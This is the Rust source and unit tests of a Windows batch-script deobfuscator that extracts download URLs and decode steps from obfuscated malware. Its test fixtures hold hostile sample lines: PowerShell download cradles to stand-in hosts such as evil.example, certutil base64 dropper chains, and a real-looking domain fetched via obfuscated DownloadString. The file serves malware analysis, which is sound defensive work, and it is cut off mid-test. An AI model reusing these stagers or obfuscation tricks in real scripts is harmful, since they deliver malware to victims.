//! harrington-core — Windows batch deobfuscator engine.
//!
pub fn version() -> &'static str {
    env!("CARGO_PKG_VERSION")
}

// Public module surface intentionally narrow: callers should reach the
// engine through `analyze` / `Config` / `Report` / `Trait` (re-exported
// at the crate root). The modules below stay `pub` because external
// fuzz harnesses, examples, or downstream library users need them; the
// rest are `pub(crate)` to give us room to refactor scanners and
// handlers without SemVer-breaking downstream code.
pub mod deob_scan;
pub mod env;
pub mod handlers;
pub mod marker_noise;
pub mod traits;

pub(crate) mod aes_chain;
pub(crate) mod arith;
pub(crate) mod for_loop;
pub(crate) mod interp;
pub(crate) mod js_scan;
pub(crate) mod labels;
pub(crate) mod lex;
pub(crate) mod line_reader;
pub(crate) mod normalize;
pub(crate) mod ps1_scan;
pub(crate) mod ps_alias;
pub(crate) mod redirect;
pub(crate) mod snapshot;
pub(crate) mod split;
pub(crate) mod synth;
pub(crate) mod vbs_scan;

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use crate::traits::Trait;

    #[test]
    fn trait_serializes_as_tagged_json() {
        let t = Trait::Download {
            cmd: "curl http://x/y".into(),
            src: "http://x/y".into(),
            dst: Some("y".into()),
        };
        let j = serde_json::to_string(&t).expect("serialize");
        assert!(j.contains("\"kind\":\"Download\""), "got: {}", j);
        assert!(j.contains("\"src\":\"http://x/y\""), "got: {}", j);
    }
}

#[cfg(test)]
mod env_tests {
    use crate::env::{Config, Environment};

    #[test]
    fn env_has_python_baseline_vars() {
        let env = Environment::new(&Config::default());
        assert_eq!(
            env.get("comspec").as_deref(),
            Some("C:\\WINDOWS\\system32\\cmd.exe")
        );
        assert_eq!(env.get("systemroot").as_deref(), Some("C:\\WINDOWS"));
        assert_eq!(env.get("number_of_processors").as_deref(), Some("4"));
        assert_eq!(env.get("os").as_deref(), Some("Windows_NT"));
    }

    #[test]
    fn env_set_and_get_case_insensitive() {
        let mut env = Environment::new(&Config::default());
        env.set("Foo", "Bar");
        assert_eq!(env.get("foo").as_deref(), Some("Bar"));
        assert_eq!(env.get("FOO").as_deref(), Some("Bar"));
    }

    #[test]
    fn env_set_empty_value_deletes() {
        let mut env = Environment::new(&Config::default());
        env.set("XYZ", "v");
        env.set("XYZ", "");
        assert!(env.get("XYZ").is_none());
    }
}

#[cfg(test)]
mod line_reader_tests {
    use crate::line_reader::read_logical_lines;

    #[test]
    fn single_line() {
        assert_eq!(
            read_logical_lines(b"echo hello\n"),
            vec!["echo hello".to_string()]
        );
    }

    #[test]
    fn caret_continuation_joins_two_lines() {
        let input = b"echo first ^\nsecond\n";
        assert_eq!(
            read_logical_lines(input),
            vec!["echo first second".to_string()]
        );
    }

    #[test]
    fn caret_continuation_allows_trailing_whitespace() {
        let input = b"echo first ^  \r\nsecond\r\n";
        assert_eq!(
            read_logical_lines(input),
            vec!["echo first second".to_string()]
        );
    }

    #[test]
    fn caret_continuation_chain() {
        let input = b"a^\nb^\nc\n";
        assert_eq!(read_logical_lines(input), vec!["abc".to_string()]);
    }

    #[test]
    fn no_caret_at_eof() {
        let input = b"echo no newline";
        assert_eq!(
            read_logical_lines(input),
            vec!["echo no newline".to_string()]
        );
    }

    #[test]
    fn crlf_handled() {
        assert_eq!(
            read_logical_lines(b"a\r\nb^\r\nc\r\n"),
            vec!["a".to_string(), "bc".to_string()]
        );
    }

    #[test]
    fn non_utf8_replaced_with_replacement_char() {
        let input = b"echo \xff\xfe\n";
        let lines = read_logical_lines(input);
        assert_eq!(lines.len(), 1);
        assert!(lines[0].starts_with("echo "));
    }
}

#[cfg(test)]
mod normalize_tests {
    use crate::env::{Config, Environment};
    use crate::lex::lex;
    use crate::normalize::normalize_to_string;

    fn interleave_markers(text: &str, markers: &[&str]) -> String {
        let mut out = String::new();
        for (idx, ch) in text.chars().enumerate() {
            out.push(ch);
            out.push_str(markers[idx % markers.len()]);
        }
        out
    }

    #[test]
    fn simple_var_expansion() {
        let mut env = Environment::new(&Config::default());
        env.set("WALLET", "43DTEF92be6XcPj5Z7U");
        let toks = lex("echo %WALLET%");
        assert_eq!(
            normalize_to_string(&toks, &mut env),
            "echo 43DTEF92be6XcPj5Z7U"
        );
    }

    #[test]
    fn unset_variable_expands_to_empty() {
        let mut env = Environment::new(&Config::default());
        let toks = lex("echo X=%MISSING%-end");
        assert_eq!(normalize_to_string(&toks, &mut env), "echo X=-end");
    }

    #[test]
    fn comspec_baseline_resolves() {
        let mut env = Environment::new(&Config::default());
        let toks = lex("%COMSPEC%");
        assert_eq!(
            normalize_to_string(&toks, &mut env),
            "C:\\WINDOWS\\system32\\cmd.exe"
        );
    }

    #[test]
    fn delayed_expansion_off_keeps_bang_literal() {
        let mut env = Environment::new(&Config::default());
        env.set("X", "value");
        env.delayed_expansion = false;
        let toks = lex("!X!");
        assert_eq!(normalize_to_string(&toks, &mut env), "!X!");
    }

    #[test]
    fn delayed_expansion_on_resolves_bang() {
        let mut env = Environment::new(&Config::default());
        env.set("X", "value");
        env.delayed_expansion = true;
        let toks = lex("!X!");
        assert_eq!(normalize_to_string(&toks, &mut env), "value");
    }

    #[test]
    fn repeated_marker_noise_is_stripped_from_batch_output() {
        let mut env = Environment::new(&Config::default());

        let noisy = interleave_markers("set X=hello & echo world", &["RFYIQ", "RlbS"]);
        let normalized = normalize_to_string(&lex(&noisy), &mut env);
        assert!(
            !normalized.contains("RFYIQ")
                && !normalized.contains("RlbS")
                && normalized.contains("set X=hello & echo world"),
            "repeated marker noise not stripped from batch output:\n{}",
            normalized
        );
    }

    #[test]
    fn repeated_marker_noise_is_stripped_next_to_base64_literal() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let b64 = base64::engine::general_purpose::STANDARD
            .encode(b"Invoke-WebRequest -Uri https://readable.example/payload.exe");
        let noisy_prefix = interleave_markers("echo powershell", &["lymsW"]);
        let script = format!("{noisy_prefix} [Convert]::FromBase64String('{b64}')");
        let normalized = normalize_to_string(&lex(&script), &mut env);
        assert!(
            normalized.contains("echo powershell")
                && normalized.contains(&b64)
                && !normalized.contains("lymsW"),
            "marker noise near base64 literal not handled:\n{}",
            normalized
        );
    }

    #[test]
    fn repeated_marker_noise_is_stripped_inside_base64_literal() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let payload = "Invoke-WebRequest -Uri https://readable.example/payload.exe;".repeat(64);
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let noisy_b64 = interleave_markers(&b64, &["lymsW"]);
        let script = format!(r#"set "X=[Convert]::FromBase64String('{noisy_b64}')""#);
        let normalized = normalize_to_string(&lex(&script), &mut env);
        assert!(
            normalized.contains(&b64) && !normalized.contains("lymsW"),
            "marker noise inside base64 literal not stripped:\n{}",
            normalized
        );
    }

    #[test]
    fn natural_shared_substring_is_not_stripped_as_marker() {
        // Bug: strip_marker_noise_line treated `ell` as a marker because it
        // appeared 4× in repeated `$Hello` and 1× in `powershell` (5 embedded
        // alpha occurrences with 1 vowel, satisfying the threshold). The fix
        // requires that suspected marker occurrences live inside long
        // sandwich-style alphabetic runs, not ordinary identifiers.
        let mut env = Environment::new(&Config::default());
        let script = r#"powershell "$Hello='A';$Hello+='B';$Hello+='C';Write-Host $Hello""#;
        let normalized = normalize_to_string(&lex(script), &mut env);
        assert!(
            normalized.contains("$Hello") && normalized.contains("powershell"),
            "natural identifier substring was stripped as marker noise:\n{}",
            normalized
        );
    }

    #[test]
    fn clean_repetitive_base64_literal_is_preserved() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let payload = "$userName = $env:USERNAME; Write-Host $userName;".repeat(64);
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            r#"powershell -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64}'))""#
        );
        let normalized = normalize_to_string(&lex(&script), &mut env);
        assert!(
            normalized.contains(&b64),
            "clean repetitive base64 literal was corrupted:\n{}",
            normalized
        );
    }

    #[test]
    fn clean_indented_base64_literal_is_preserved() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let payload = "if ($line -match ':: (.+)$') {            Write-Host 'Injection code detected';            $decodedBytes = [Convert]::FromBase64String($matches[1].Trim());        }\n".repeat(32);
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            r#"powershell -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64}'))""#
        );
        let normalized = normalize_to_string(&lex(&script), &mut env);
        assert!(
            normalized.contains(&b64),
            "clean indented base64 literal was corrupted:\n{}",
            normalized
        );
    }

    #[test]
    fn clean_base64_assembled_from_variables_is_preserved() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        env.delayed_expansion = true;
        let payload = "if ($line -match ':: (.+)$') {            Write-Host 'Injection code detected';            $decodedBytes = [Convert]::FromBase64String($matches[1].Trim());        }\n".repeat(32);
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let mut refs = String::new();
        for (idx, chunk) in b64.as_bytes().chunks(22).enumerate() {
            let chunk = String::from_utf8_lossy(chunk);
            env.set(&format!("v{idx}"), &chunk);
            refs.push_str(&format!("!v{idx}!"));
        }
        let script = format!(
            r#"powershell -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{refs}'))""#
        );
        let normalized = normalize_to_string(&lex(&script), &mut env);
        assert!(
            normalized.contains(&b64),
            "assembled clean base64 literal was corrupted:\n{}",
            normalized
        );
    }

    #[test]
    fn powershell_replace_marker_argument_is_preserved() {
        let mut env = Environment::new(&Config::default());
        let script = r#"powershell -Command "'AAsvxrzBB'.Replace('svxrz','')""#;
        let normalized = normalize_to_string(&lex(script), &mut env);
        assert!(
            normalized.contains(".Replace('svxrz','')"),
            "replace marker argument was stripped:\n{}",
            normalized
        );
    }
}

#[cfg(test)]
mod lex_type_tests {
    use crate::lex::{PercentTildeFlags, Token, VarOp};

    #[test]
    #[allow(clippy::expect_used)]
    fn percent_tilde_flags_parse() {
        let f = PercentTildeFlags::parse("dpnx").expect("parse");
        assert!(f.d && f.p && f.n && f.x);
        assert!(!f.f);
        assert_eq!(PercentTildeFlags::parse("dpZ"), None);
    }

    #[test]
    fn token_equality() {
        let a = Token::Word("echo".into());
        let b = Token::Word("echo".into());
        assert_eq!(a, b);
        assert_ne!(
            Token::VarPercent {
                name: "x".into(),
                op: None
            },
            Token::VarBang {
                name: "x".into(),
                op: None
            }
        );
        let _v = VarOp::Substr {
            index: -7,
            length: Some(3),
        };
    }
}

#[cfg(test)]
mod split_tests {
    use crate::split::split_commands;

    #[test]
    fn simple_one() {
        assert_eq!(split_commands("echo hi"), vec!["echo hi"]);
    }

    #[test]
    fn ampersand_splits() {
        assert_eq!(split_commands("echo a && echo b"), vec!["echo a", "echo b"]);
    }

    #[test]
    fn pipe_keeps_pipeline_together() {
        // Single `|` is a PIPELINE — semantically one logical command
        // that streams cmd1's output into cmd2's input. Splitting on
        // `|` lost the pipe operator entirely from the deob, turning
        // `type X|cmd` into two unrelated lines. `||` (failure
        // separator) still splits.
        assert_eq!(split_commands("echo a | find b"), vec!["echo a | find b"]);
        assert_eq!(split_commands("echo a || echo b"), vec!["echo a", "echo b"]);
    }

    #[test]
    fn caret_escapes_pipe() {
        assert_eq!(
            split_commands(r#"echo tasklist ^| find ":""#),
            vec![r#"echo tasklist ^| find ":""#]
        );
    }

    #[test]
    fn quoted_pipe_not_split() {
        assert_eq!(
            split_commands(r#"echo "a|b" & echo c"#),
            vec![r#"echo "a|b""#, "echo c"]
        );
    }

    #[test]
    fn redirect_amp_kept() {
        assert_eq!(split_commands("foo 2>&1"), vec!["foo 2>&1"]);
    }
}

#[cfg(test)]
mod interp_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;

    #[test]
    fn echo_is_no_op_for_now() {
        let mut env = Environment::new(&Config::default());
        interpret_line("echo hello", &mut env);
        assert!(env.traits.is_empty());
    }

    #[test]
    fn unknown_command_is_silent() {
        let mut env = Environment::new(&Config::default());
        interpret_line("notacommand foo bar", &mut env);
        assert!(env.traits.is_empty());
    }
}

#[cfg(test)]
mod set_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;

    #[test]
    fn set_basic() {
        let mut env = Environment::new(&Config::default());
        interpret_line("set FOO=bar", &mut env);
        assert_eq!(env.get("foo").as_deref(), Some("bar"));
    }

    #[test]
    fn set_empty_deletes() {
        let mut env = Environment::new(&Config::default());
        interpret_line("set FOO=x", &mut env);
        interpret_line("set FOO=", &mut env);
        assert!(env.get("foo").is_none());
    }

    #[test]
    fn set_with_trailing_space_kept() {
        let mut env = Environment::new(&Config::default());
        interpret_line("set EXP=43 ", &mut env);
        assert_eq!(env.get("exp").as_deref(), Some("43 "));
    }

    #[test]
    fn set_quoted_preserves_trailing_spaces() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"set "EXP =43""#, &mut env);
        assert_eq!(env.get("exp ").as_deref(), Some("43"));
    }

    #[test]
    fn set_quoted_value_with_spaces() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"set "EXP= 43""#, &mut env);
        assert_eq!(env.get("exp").as_deref(), Some(" 43"));
    }
}

#[cfg(test)]
mod analyze_tests {
    use crate::analyze;
    use crate::env::Config;
    use crate::traits::Trait;

    #[test]
    fn analyze_resolves_var_chain() {
        let script = b"set GREET=hi\r\necho %GREET% world\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo hi world"),
            "deobf:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn analyze_resolves_unset_unicode_noise_var_in_command_name() {
        let script = concat!(
            "s%يح س،لال%et \"A=http\"\r\n",
            "s%يح س،لال%et \"B=s://\"\r\n",
            "s%يح س،لال%et \"C=example.com/payload.bat\"\r\n",
            "echo %A%%B%%C%\r\n",
        );
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src == "https://example.com/payload.bat"
            )
        });
        assert!(has, "unicode-noise var chain missed: {:?}", report.traits);
    }

    #[test]
    fn analyze_extracts_inline_powershell_callbyname_downloadstring() {
        let script = concat!(
            "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
            "$tty55='(New-','Obje','ct Ne','t.We','bCli','ent)';",
            "$tty=iex($tty55 -join '');",
            "$rot='Down','load','Str','ing';",
            "$rotJ=($rot -join '');",
            "$bnt='https','://antuofermo.it/G12.txt';",
            "$bntJ=($bnt -join '');",
            "$mv=[Microsoft.VisualBasic.Interaction]::CallByname($tty,$rotJ,[Microsoft.VisualBasic.CallType]::Method,$bntJ);\r\n",
        );
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://antuofermo.it/G12.txt"
            )
        });
        assert!(
            has,
            "CallByName DownloadString URL missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn analyze_handles_caret_continuation_and_split() {
        let script = b"set X=hello & echo %X%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo hello"),
            "deobf:\n{}",
            report.deobfuscated
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod echo_tests {
    use crate::env::{Config, Environment, FsEntry};
    use crate::interp::interpret_line;
    use crate::traits::Trait;
    use crate::{analyze, Config as AnalyzeConfig};
    use base64::Engine;

    #[test]
    fn echo_to_file_records_content() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#">out.txt echo hello"#, &mut env);
        let key = "out.txt";
        assert!(
            env.modified_filesystem.contains_key(key),
            "filesystem: {:?}",
            env.modified_filesystem
        );
    }

    #[test]
    fn echo_append_to_file_concatenates() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#">out.txt echo first"#, &mut env);
        interpret_line(r#">>out.txt echo second"#, &mut env);
        let entry = env.modified_filesystem.get("out.txt").expect("fs");
        if let FsEntry::Content { content, append } = entry {
            assert_eq!(content, b"first\r\nsecond\r\n");
            assert!(*append);
        } else {
            panic!("not Content: {:?}", entry);
        }
    }

    #[test]
    fn echo_append_traits_record_only_new_chunk() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#">out.txt echo first"#, &mut env);
        interpret_line(r#">>out.txt echo second"#, &mut env);
        let chunks: Vec<_> = env
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::EchoRedirect { content, .. } => Some(content.as_slice()),
                _ => None,
            })
            .collect();
        assert_eq!(
            chunks,
            vec![b"first\r\n".as_slice(), b"second\r\n".as_slice()]
        );
    }

    #[test]
    fn large_top_level_echo_base64_run_is_collapsed_but_materialized() {
        let mut child = String::from("@echo off\r\ncurl http://large-echo-run.example/p\r\n");
        while child.len() < 220 * 1024 {
            child.push_str("rem padding for collapse threshold\r\n");
        }
        let encoded = base64::engine::general_purpose::STANDARD.encode(child.as_bytes());
        let mut script = String::from(
            r#"set "B64FILE=%APPDATA%\child.b64"
if exist "%B64FILE%" del "%B64FILE%"
"#,
        );
        let first_chunk = &encoded[..76];
        for chunk in encoded.as_bytes().chunks(76) {
            let chunk = std::str::from_utf8(chunk).expect("base64 chunk is utf8");
            script.push_str(&format!(r#"echo {chunk}>>"%B64FILE%""#));
            script.push_str("\r\n");
        }
        script.push_str(r#"certutil -decode "%B64FILE%" child.bat"#);
        script.push_str("\r\n");

        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());

        assert!(
            report.deobfuscated.contains("omitted")
                && report.deobfuscated.contains("redirected echo run"),
            "large echo run was not summarized:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains(first_chunk),
            "large base64 chunk leaked into deob output"
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, .. }
                        if src == "http://large-echo-run.example/p"
                )
            }),
            "decoded child payload URL missed: {:?}",
            report.traits
        );
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::EchoRedirect { .. })),
            "collapsed echo chunks should not emit per-line EchoRedirect traits"
        );
    }

    #[test]
    fn echo_inline_redirect_without_space_records_content() {
        let mut env = Environment::new(&Config::default());
        interpret_line("echo SGVsbG8=>payload.b64", &mut env);
        let entry = env
            .modified_filesystem
            .get("payload.b64")
            .expect("inline echo target not recorded");
        match entry {
            FsEntry::Content { content, .. } => assert_eq!(content, b"SGVsbG8=\r\n"),
            other => panic!("not Content: {:?}", other),
        }
    }

    #[test]
    fn block_close_redirect_does_not_emit_unresolved_pipeline() {
        let script = b"(\r\necho hello\r\n) > \"%TEMP%\\out.txt\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline == ")")),
            "block close redirect should not be treated as a command pipeline: {:?}",
            report.traits
        );
    }

    #[test]
    fn block_echo_writes_file_for_certutil_decode() {
        use base64::Engine;
        // `(echo b64...\necho b64...) > f.b64` then `certutil -decode f.b64 g`
        // must materialize the block content so the decode resolves.
        // base64 of "MZhello" split across two echo lines.
        let b64 = base64::engine::general_purpose::STANDARD.encode(b"hello world payload");
        let (a, b) = b64.split_at(b64.len() / 2);
        let script = format!(
            "(\r\necho {a}\r\necho {b}\r\n) > \"x.b64\"\r\ncertutil -decode \"x.b64\" \"y.txt\"\r\n"
        );
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::CertutilDecode { src_resolved, .. } if *src_resolved)),
            "block-echo b64 should resolve the certutil source: {:?}",
            report.traits
        );
    }

    #[test]
    fn large_block_echo_blob_is_collapsed_but_decoded_child_is_analyzed() {
        use base64::Engine;

        let padding = "rem pad\r\n".repeat(40_000);
        let inner = format!(
            "@echo off\r\npowershell -c \"iwr https://large-block.example/payload.exe\"\r\n{padding}"
        );
        let b64 = base64::engine::general_purpose::STANDARD.encode(inner.as_bytes());
        let mut script = String::from("@echo off\r\n(\r\n");
        for chunk in b64.as_bytes().chunks(4096) {
            script.push_str("echo ");
            script.push_str(std::str::from_utf8(chunk).unwrap());
            script.push_str("\r\n");
        }
        script.push_str(
            ") > \"p.b64\"\r\ncertutil -decode \"p.b64\" \"p.bat\"\r\ncall \"p.bat\"\r\n",
        );

        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());

        assert!(
            report.deobfuscated.contains("harrington: omitted")
                && report.deobfuscated.len() < script.len() / 4,
            "large block should be summarized, deob={} script={}",
            report.deobfuscated.len(),
            script.len()
        );
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::OutputCapped { .. })),
            "collapsed blob should not trip output cap: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| match t {
                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => {
                    src.contains("large-block.example/payload.exe")
                }
                _ => false,
            }),
            "decoded child URL not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn block_echo_b64_polyglot_certutil_call_extracts_inner_url() {
        // The 8270 idiom: write a base64 bat/PS polyglot via a `(echo...) > f`
        // block, `certutil -decode` it, `call` it. The polyglot's PS half is
        // reached via `IEX ReadAllText('%~f0')`; its DownloadFile URL must be
        // recovered.
        use base64::Engine;
        let inner = "<# :batch\r\n@echo off\r\npowershell -Command \"IEX $([IO.File]::ReadAllText('%~f0'))\"\r\ngoto :eof\r\n#>\r\nInvoke-WebRequest -Uri 'https://evil.example/stage2.zip' -OutFile $env:TEMP\\s.zip\r\n";
        let b64 = base64::engine::general_purpose::STANDARD.encode(inner.as_bytes());
        let mut script = String::from("@echo off\r\n(\r\n");
        for chunk in b64.as_bytes().chunks(64) {
            script.push_str("echo ");
            script.push_str(std::str::from_utf8(chunk).unwrap());
            script.push_str("\r\n");
        }
        script.push_str(
            ") > \"p.b64\"\r\ncertutil -decode \"p.b64\" \"p.bat\"\r\ncall \"p.bat\"\r\n",
        );
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
        let found = report.traits.iter().any(|t| match t {
            Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => {
                src.contains("evil.example/stage2.zip")
            }
            _ => false,
        });
        assert!(
            found,
            "inner polyglot URL not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn start_quoted_url_is_extracted() {
        // `start "" "URL"` opens the URL in the default handler.
        let script = b"start \"\" \"https://opened.example/doc.pdf\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| matches!(t,
                Trait::Download { src, .. } if src == "https://opened.example/doc.pdf")),
            "start-quoted URL not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn delayed_expansion_name_built_from_substring_chain() {
        // AbObUs-family / xworm-like obfuscators build a delayed-expansion
        // var name itself from a chain of `%alphabet:~N,1%` substring refs:
        //   !%A:~18,1%%A:~20,1%!  →  !QT!  →  env[QT]
        // The lex must pass the whole `%…%`-laden span as the VarBang name
        // and expand_var must pre-expand it before env.get.
        let script =
            b"@echo off\r\nSet A=ibsJzaLXqmnEkuItcwQhTOG\r\nsetlocal EnableDelayedExpansion\r\nset \"QT=https://evil.example/p\"\r\necho !%A:~18,1%%A:~20,1%!\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("https://evil.example/p"),
            "substring-built !X! not resolved: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn set_bang_prefixed_name_and_caret_var_ref_resolves() {
        // LC NO-... family: var names literally start with `!` (defined via
        // `SET !h=E`, referenced as `%!h%`). The lex used to drop the `%`
        // and `!` sigils, mangling the reference. The carets between sigils
        // (`^%!4%^%!h%`) are no-ops because CMD's variable-expansion phase
        // runs BEFORE caret processing.
        let script = b"@echo off\r\n\
            SET !h=E\r\nSET !T=c\r\nSET !4=d\r\n\
            SET URL=http://evil.example/p\r\n\
            %!T%m^%!4%.%!h%^x%!h% /c echo %URL%\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("cmd.ExE") || report.deobfuscated.contains("cmd.exe"),
            "%!X% style ref not resolved: {:?}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.contains("http://evil.example/p"),
            "URL missing after %!X% resolution: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn marker_noise_keeps_natural_trigram_in_repeated_var_name() {
        // Sandwich detector used to count each REUSE of the same alphabetic
        // run (a PS variable name reused many times) as an independent
        // sandwich host, so a natural trigram like `ers` in
        // `Oversigtsbilleders` would qualify as noise and get stripped from
        // `powershell` → `powhell`. Dedupe per run-content fixes this.
        let mut script = String::from("@echo off\r\n");
        script.push_str("start /min powershell.exe -windowstyle hidden \"");
        for _ in 0..40 {
            script.push_str("$Oversigtsbilleders=1;");
        }
        script.push_str("\"\r\n");
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("powershell.exe"),
            "marker-noise pass stripped natural `ers` trigram: {:?}",
            &report.deobfuscated[..200.min(report.deobfuscated.len())]
        );
    }

    #[test]
    fn latin1_high_byte_var_names_keep_distinct_keys() {
        // High-byte char-cipher families (Factura, ae8c…, 0d16…) use raw
        // cp1252/Latin-1 bytes as var names — each distinct high byte is
        // a different alphabet slot. UTF-8-lossy collapses every invalid
        // byte to U+FFFD, making `%<0xC1>%` and `%<0xC2>%` resolve to the
        // SAME var and overwriting each other. Latin-1 fallback when the
        // input is not valid UTF-8 preserves the distinct byte values.
        let mut script: Vec<u8> = Vec::new();
        script.extend_from_slice(b"@echo off\r\n");
        // Two distinct high-byte var names — UTF-8-invalid as bytes.
        script.extend_from_slice(b"set \"\xC1=http://distinct1.example/\"\r\n");
        script.extend_from_slice(b"set \"\xC2=http://distinct2.example/\"\r\n");
        script.extend_from_slice(b"echo url1=%\xC1% url2=%\xC2%\r\n");
        let report = analyze(&script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("http://distinct1.example/")
                && report.deobfuscated.contains("http://distinct2.example/"),
            "high-byte var names collapsed: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn echo_block_redirect_target_uses_var_expanded_path() {
        // `(echo X) > "%_t%"` with `set _t=…` above must store the file
        // under the var-expanded path, otherwise the following
        // `certutil -decode "%_t%"` (which arrives expanded) misses.
        // Contract_Project_Agreement (d29d…) family.
        let script = b"@echo off\r\n\
            set _t=C:\\Temp\\stage.b64\r\n\
            set _b=C:\\Temp\\stage.bat\r\n\
            (\r\n\
            echo aHR0cDovL2V2aWwuZXhhbXBsZS9wMQ==\r\n\
            ) > \"%_t%\"\r\n\
            certutil -decode \"%_t%\" \"%_b%\" >nul\r\n\
            call \"%_b%\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let resolved = report.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::CertutilDecode {
                    src_resolved: true,
                    ..
                }
            )
        });
        assert!(
            resolved,
            "certutil -decode src not resolved by pre-scan: traits={:?}",
            report.traits
        );
    }

    #[test]
    fn utf16le_bom_with_ascii_body_strips_bom() {
        // Some bats are saved with a stray `0xFF 0xFE` prefix but the body
        // is plain ASCII (no NUL bytes between chars). Without BOM strip,
        // the first lex line picks up `ÿþ` as garbage chars and ALL downstream
        // var-name lookups silently miss for that line. d0410… family.
        let mut script: Vec<u8> = vec![0xFF, 0xFE];
        script.extend_from_slice(
            b"@echo off\r\nset URL=http://bom-mislabel.example/p\r\necho %URL%\r\n",
        );
        let report = analyze(&script, &AnalyzeConfig::default());
        assert!(
            report
                .deobfuscated
                .contains("http://bom-mislabel.example/p"),
            "BOM-prefixed ASCII not handled: {:?}",
            report.deobfuscated
        );
        // BOM glyph itself shouldn't appear in the deob.
        assert!(
            !report.deobfuscated.contains('\u{FEFF}') && !report.deobfuscated.contains('ÿ'),
            "BOM not stripped: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn utf16le_proper_decodes_to_text() {
        // Real UTF-16LE bat (every other byte is NUL for ASCII content).
        let mut script: Vec<u8> = vec![0xFF, 0xFE];
        for ch in "@echo off\r\nset URL=http://utf16le.example/p\r\necho %URL%\r\n".chars() {
            script.push(ch as u8);
            script.push(0);
        }
        let report = analyze(&script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("http://utf16le.example/p"),
            "real UTF-16LE not decoded: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn single_char_decorator_var_refs_empty_expand() {
        // 1ef41988-... family: every char of `powershell` is sandwiched
        // between `%-%`, `%!%`, `%+%`, `%?%`, `%=%`, `%#%`, `%@%` decorators
        // (single-char var names — usually undefined → empty). Each `%X%`
        // (closed) must empty-expand so the surrounding chars assemble into
        // `powershell`. The earlier `name == "!"` guard incorrectly dropped
        // `%!%`, leaving stray `!` and `%` chars that broke assembly.
        let script = b"@echo off\r\necho pow%-%ers%!%h%+%e%+%ll%?% -%=%c %!%#%=%\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("powershell"),
            "single-char decorators not empty-expanded: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn unresolved_for_loop_var_in_url_filtered_out() {
        // win.bat (fb8bb3cf…) family: a `for /f` whose pipeline can't
        // resolve statically (e.g. `ping host | find host`) leaves the
        // loop variable `%%B` unresolved. The body's `set ipaddress=%%B`
        // stores `%%B` literally; later `set url=http://%ipaddress%` →
        // `http://%%B`. URL regex matches it, producing a junk IOC.
        let script = b"@echo off\r\n\
            for /f \"tokens=1,2 delims=[]\" %%A in ('ping host.example ^| find \"host.example\"') do set ip=%%B\r\n\
            set url=http://%ip%/svc\r\n\
            echo %url%\r\n";
